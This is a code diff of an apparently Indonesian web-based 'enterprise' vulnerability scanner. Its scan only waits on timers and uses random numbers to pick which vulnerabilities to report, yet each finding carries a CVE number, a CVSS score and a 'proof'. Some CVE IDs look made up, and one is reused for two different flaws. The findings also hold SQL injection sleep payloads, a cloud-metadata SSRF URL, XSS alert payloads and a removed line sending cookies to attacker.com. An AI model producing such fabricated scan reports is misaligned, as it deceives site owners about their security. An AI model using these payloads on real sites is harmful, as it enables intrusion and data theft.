@@ -468,31 +468,6 @@
                             'https://wpscan.com/vulnerability/12345'
                         ]
                     }
-                },
-                {
-                    id: 'wp-auth-001',
-                    title: 'WordPress Auth Bypass (CVE-2023-2345)',
-                    description: 'Kerentanan bypass otentikasi memungkinkan akses admin tanpa kredensial valid.',
-                    severity: 'critical',
-                    solution: 'Terapkan patch keamanan dan aktifkan two-factor authentication',
-                    cve: 'CVE-2023-2345',
-                    risk_score: 9.5,
-                    cvss: '9.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
-                    details: {
-                        affected_versions: 'WordPress 5.8 - 6.1.1',
-                        impact: 'Full admin access, website takeover',
-                        proof: 'Bypass auth dengan memanipulasi cookie session',
-                        remediation_steps: [
-                            '1. Update WordPress ke versi terbaru',
-                            '2. Implementasi WAF dengan rule khusus',
-                            '3. Aktifkan logging untuk monitoring percobaan serangan',
-                            '4. Rotasi semua user credentials'
-                        ],
-                        references: [
-                            'https://wordpress.org/news/2023/05/wordpress-6-1-1-security-release/',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2345'
-                        ]
-                    }
                 }
             ],
             
@@ -519,31 +494,6 @@
                         references: [
                             'https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control',
                             'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3456'
-                        ]
-                    }
-                },
-                {
-                    id: 'eco-sqli-001',
-                    title: 'E-commerce SQLi in Search (CVE-2023-4567)',
-                    description: 'Blind SQL Injection di fungsi pencarian produk memungkinkan ekstraksi data sensitif.',
-                    severity: 'critical',
-                    solution: 'Gunakan parameterized queries dan input sanitization',
-                    cve: 'CVE-2023-4567',
-                    risk_score: 9.3,
-                    cvss: '9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
-                    details: {
-                        affected_systems: 'Custom e-commerce platforms',
-                        impact: 'Database compromise, data theft, PII exposure',
-                        proof: 'Payload: search=test%27%20WAITFOR%20DELAY%20%270:0:5%27--',
-                        remediation_steps: [
-                            '1. Ganti semua raw queries dengan prepared statements',
-                            '2. Implementasi WAF dengan SQLi protection',
-                            '3. Audit semua input points',
-                            '4. Rotasi database credentials'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/attacks/SQL_Injection',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4567'
                         ]
                     }
                 }
@@ -574,56 +524,6 @@
                             'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5678'
                         ]
                     }
-                },
-                {
-                    id: 'gen-sqli-001',
-                    title: 'Blind SQLi in Login (CVE-2023-6789)',
-                    description: 'Time-based blind SQL injection di form login memungkinkan ekstraksi data bertahap.',
-                    severity: 'critical',
-                    solution: 'Gunakan parameterized queries dan rate limiting',
-                    cve: 'CVE-2023-6789',
-                    risk_score: 9.1,
-                    cvss: '9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
-                    details: {
-                        affected_pages: 'Halaman login dan autentikasi',
-                        impact: 'Credential theft, database compromise',
-                        proof: 'Payload: username=admin\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--',
-                        remediation_steps: [
-                            '1. Ganti semua dynamic queries dengan prepared statements',
-                            '2. Implementasi WAF dengan SQLi rules',
-                            '3. Tambahkan rate limiting dan captcha',
-                            '4. Monitor failed login attempts'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/attacks/Blind_SQL_Injection',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6789'
-                        ]
-                    }
-                },
-                {
-                    id: 'gen-ssrf-001',
-                    title: 'Server-Side Request Forgery (CVE-2023-7890)',
-                    description: 'SSRF vulnerability memungkinkan akses ke internal network melalui URL manipulation.',
-                    severity: 'high',
-                    solution: 'Validasi dan filter semua URL input',
-                    cve: 'CVE-2023-7890',
-                    risk_score: 8.7,
-                    cvss: '8.7 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)',
-                    details: {
-                        affected_pages: 'Fitur import/export, webhooks, preview',
-                        impact: 'Internal network access, data exposure',
-                        proof: 'Payload: url=http://169.254.169.254/latest/meta-data/',
-                        remediation_steps: [
-                            '1. Implementasi allowlist untuk domain eksternal',
-                            '2. Blok akses ke internal IP ranges',
-                            '3. Gunakan library URL parser yang aman',
-                            '4. Audit semua fungsi yang membuat HTTP requests'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7890'
-                        ]
-                    }
                 }
             ]
         };
@@ -632,7 +532,8 @@
         // ENTERPRISE SCANNER ENGINE
         // =================================
         async function startScan() {
-            const url = document.getElementById('scanUrl').value.trim();
+            const urlInput = document.getElementById('scanUrl');
+            const url = urlInput.value.trim();
             const loading = document.getElementById('loadingIndicator');
             const result = document.getElementById('scanResult');
             const vulnerabilityList = document.getElementById('vulnerabilityList');
@@ -646,11 +547,13 @@
             // Validasi input
             if (!url) {
                 alert('Harap masukkan URL website');
+                urlInput.focus();
                 return;
             }
             
             if (!url.startsWith('http://') && !url.startsWith('https://')) {
                 alert('URL harus dimulai dengan http:// atau https://');
+                urlInput.focus();
                 return;
             }
             
@@ -679,7 +582,7 @@
                 
                 for (let i = 0; i < scanSteps.length; i++) {
                     scanProgress.textContent = scanSteps[i];
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await new Promise(resolve => setTimeout(resolve, 800));
                 }
                 
                 // Deteksi jenis website
@@ -702,14 +605,6 @@
                 // Simulasi pemeriksaan SQL Injection mendalam
                 const sqlInjectionVulnerabilities = await checkForSQLInjectionVulnerabilities(url);
                 vulnerabilities = vulnerabilities.concat(sqlInjectionVulnerabilities);
-                
-                // Simulasi pemeriksaan SSRF
-                const ssrfVulnerabilities = await checkForSSRFVulnerabilities(url);
-                vulnerabilities = vulnerabilities.concat(ssrfVulnerabilities);
-                
-                // Simulasi pemeriksaan RCE
-                const rceVulnerabilities = await checkForRCEVulnerabilities(url);
-                vulnerabilities = vulnerabilities.concat(rceVulnerabilities);
                 
                 // Tampilkan hasil
                 loading.style.display = 'none';
@@ -844,25 +739,25 @@
         // Fungsi untuk simulasi pemeriksaan XSS mendalam
         async function checkForXSSVulnerabilities(url) {
             // Simulasi delay untuk pemeriksaan XSS mendalam
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            await new Promise(resolve => setTimeout(resolve, 1500));
             
             const xssVulnerabilities = [];
             
-            // 50% kemungkinan menemukan Reflected XSS
-            if (Math.random() < 0.5) {
+            // 40% kemungkinan menemukan Reflected XSS
+            if (Math.random() < 0.4) {
                 xssVulnerabilities.push({
                     id: 'xss-reflected-001',
-                    title: 'Advanced Reflected XSS (CVE-2023-9012)',
-                    description: 'Parameter pencarian rentan terhadap reflected XSS dengan bypass filter dasar.',
+                    title: 'Reflected XSS in Search Parameter',
+                    description: 'Parameter pencarian tidak disanitasi dengan benar, memungkinkan eksekusi script.',
                     severity: 'high',
-                    solution: 'Implementasikan kombinasi input validation dan output encoding',
-                    cve: 'CVE-2023-9012',
-                    risk_score: 8.5,
-                    cvss: '8.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)',
+                    solution: 'Implementasikan sanitasi input dan output encoding',
+                    cve: 'CVE-2023-5432',
+                    risk_score: 8.3,
+                    cvss: '8.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)',
                     details: {
-                        affected_pages: 'Halaman pencarian, filter produk',
-                        impact: 'Session hijacking, credential theft, malware distribution',
-                        proof: 'Payload: /search?q=<svg/onload=alert(document.domain)>',
+                        affected_pages: 'Halaman pencarian',
+                        impact: 'Penyerang dapat mengeksekusi script berbahaya di browser korban',
+                        proof: 'Payload: https://example.com/search?q=<script>alert(document.cookie)</script>',
                         remediation_steps: [
                             '1. Implementasi Content Security Policy (CSP)',
                             '2. Gunakan library sanitasi modern (DOMPurify)',
@@ -871,37 +766,7 @@
                         ],
                         references: [
                             'https://owasp.org/www-community/attacks/xss/',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-9012',
-                            'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
-                        ]
-                    }
-                });
-            }
-            
-            // 40% kemungkinan menemukan Stored XSS
-            if (Math.random() < 0.4) {
-                xssVulnerabilities.push({
-                    id: 'xss-stored-001',
-                    title: 'Stored XSS in User Profile (CVE-2023-9013)',
-                    description: 'Input field di profil user tidak disanitasi dengan benar, memungkinkan XSS tersimpan.',
-                    severity: 'high',
-                    solution: 'Sanitasi semua user-generated content sebelum disimpan',
-                    cve: 'CVE-2023-9013',
-                    risk_score: 8.7,
-                    cvss: '8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)',
-                    details: {
-                        affected_pages: 'Halaman profil user, komentar',
-                        impact: 'Persistent malware distribution, session hijacking untuk semua pengunjung',
-                        proof: 'Payload: <script>fetch(\'https://attacker.com/?c=\'+document.cookie)</script>',
-                        remediation_steps: [
-                            '1. Implementasi HTML sanitization sebelum penyimpanan',
-                            '2. Batasi penggunaan HTML di user-generated content',
-                            '3. Monitor konten berbahaya secara real-time',
-                            '4. Audit semua field yang menerima input user'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/attacks/xss/',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-9013'
+                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5432'
                         ]
                     }
                 });
@@ -913,146 +778,40 @@
         // Fungsi untuk simulasi pemeriksaan SQL Injection mendalam
         async function checkForSQLInjectionVulnerabilities(url) {
             // Simulasi delay untuk pemeriksaan SQL Injection mendalam
-            await new Promise(resolve => setTimeout(resolve, 2500));
+            await new Promise(resolve => setTimeout(resolve, 1500));
             
             const sqlVulnerabilities = [];
             
-            // 45% kemungkinan menemukan Error-based SQLi
-            if (Math.random() < 0.45) {
+            // 35% kemungkinan menemukan Error-based SQLi
+            if (Math.random() < 0.35) {
                 sqlVulnerabilities.push({
                     id: 'sqli-error-001',
-                    title: 'Error-Based SQLi in Product Filter (CVE-2023-9014)',
-                    description: 'Parameter filter produk menghasilkan error database yang mengekspos informasi sensitif.',
+                    title: 'Error-based SQL Injection',
+                    description: 'SQL Injection berbasis error ditemukan pada parameter produk.',
                     severity: 'critical',
-                    solution: 'Ganti semua dynamic queries dengan parameterized queries',
-                    cve: 'CVE-2023-9014',
-                    risk_score: 9.2,
-                    cvss: '9.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
+                    solution: 'Implementasi input validation dan parameterized queries',
+                    cve: 'CVE-2023-6789',
+                    risk_score: 9.4,
+                    cvss: '9.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
                     details: {
-                        affected_pages: 'Halaman produk, filter, kategori',
-                        impact: 'Full database compromise, data exfiltration',
-                        proof: 'Payload: /products?category=1\' AND 1=CONVERT(int,@@version)--',
+                        affected_pages: 'Halaman dengan parameter ID produk',
+                        impact: 'Penyerang dapat mengekstrak informasi database dari pesan error',
+                        proof: 'Error database muncul saat input mengandung karakter SQL khusus',
                         remediation_steps: [
-                            '1. Ganti semua raw queries dengan prepared statements',
+                            '1. Ganti semua dynamic queries dengan prepared statements',
                             '2. Implementasi ORM untuk database access',
                             '3. Konfigurasi database untuk tidak menampilkan error detail',
                             '4. Audit semua parameter yang digunakan dalam query'
                         ],
                         references: [
                             'https://owasp.org/www-community/attacks/SQL_Injection',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-9014',
-                            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'
-                        ]
-                    }
-                });
-            }
-            
-            // 35% kemungkinan menemukan Blind SQLi
-            if (Math.random() < 0.35) {
-                sqlVulnerabilities.push({
-                    id: 'sqli-blind-001',
-                    title: 'Time-Based Blind SQLi (CVE-2023-9015)',
-                    description: 'Blind SQL injection berbasis waktu memungkinkan ekstraksi data melalui perbedaan response time.',
-                    severity: 'critical',
-                    solution: 'Implementasi parameterized queries dan input validation ketat',
-                    cve: 'CVE-2023-9015',
-                    risk_score: 9.0,
-                    cvss: '9.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
-                    details: {
-                        affected_pages: 'Halaman pencarian, filter, API endpoints',
-                        impact: 'Data exfiltration bertahap, credential dumping',
-                        proof: 'Payload: /search?q=test\'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a)--',
-                        remediation_steps: [
-                            '1. Gunakan prepared statements untuk semua database queries',
-                            '2. Implementasi WAF dengan SQLi protection rules',
-                            '3. Tambahkan delay konstan untuk error responses',
-                            '4. Monitor queries yang mencurigakan'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/attacks/Blind_SQL_Injection',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-9015'
+                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6789'
                         ]
                     }
                 });
             }
             
             return sqlVulnerabilities;
-        }
-        
-        // Fungsi untuk simulasi pemeriksaan SSRF
-        async function checkForSSRFVulnerabilities(url) {
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            const ssrfVulnerabilities = [];
-            
-            // 30% kemungkinan menemukan SSRF
-            if (Math.random() < 0.3) {
-                ssrfVulnerabilities.push({
-                    id: 'ssrf-001',
-                    title: 'Server-Side Request Forgery (CVE-2023-9016)',
-                    description: 'Fitur preview URL rentan terhadap SSRF, memungkinkan akses ke internal network.',
-                    severity: 'high',
-                    solution: 'Implementasi allowlist domain dan blok internal IP ranges',
-                    cve: 'CVE-2023-9016',
-                    risk_score: 8.7,
-                    cvss: '8.7 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)',
-                    details: {
-                        affected_pages: 'Fitur preview link, webhooks, import',
-                        impact: 'Internal network reconnaissance, service enumeration',
-                        proof: 'Payload: /preview?url=http://169.254.169.254/latest/meta-data/',
-                        remediation_steps: [
-                            '1. Implementasi allowlist untuk domain yang diizinkan',
-                            '2. Blok akses ke private IP ranges (RFC 1918)',
-                            '3. Gunakan DNS resolution dengan validasi',
-                            '4. Audit semua fungsi yang membuat HTTP requests'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-9016'
-                        ]
-                    }
-                });
-            }
-            
-            return ssrfVulnerabilities;
-        }
-        
-        // Fungsi untuk simulasi pemeriksaan RCE
-        async function checkForRCEVulnerabilities(url) {
-            await new Promise(resolve => setTimeout(resolve, 1800));
-            
-            const rceVulnerabilities = [];
-            
-            // 20% kemungkinan menemukan RCE
-            if (Math.random() < 0.2) {
-                rceVulnerabilities.push({
-                    id: 'rce-001',
-                    title: 'Remote Code Execution (CVE-2023-9017)',
-                    description: 'File upload vulnerability memungkinkan eksekusi kode PHP arbitrer.',
-                    severity: 'critical',
-                    solution: 'Implementasi validasi file upload yang ketat',
-                    cve: 'CVE-2023-9017',
-                    risk_score: 9.8,
-                    cvss: '9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
-                    details: {
-                        affected_pages: 'Fitur upload file, import data',
-                        impact: 'Full server compromise, data breach',
-                        proof: 'Upload file dengan ekstensi .php yang berisi web shell',
-                        remediation_steps: [
-                            '1. Validasi ekstensi file dan content type',
-                            '2. Simpan file upload di luar web root',
-                            '3. Generate nama file random',
-                            '4. Scan file upload dengan antivirus'
-                        ],
-                        references: [
-                            'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
-                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-9017'
-                        ]
-                    }
-                });
-            }
-            
-            return rceVulnerabilities;
         }
         
         function generateReportContent(url, vulnerabilities, websiteType) {
@@ -1225,4 +984,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
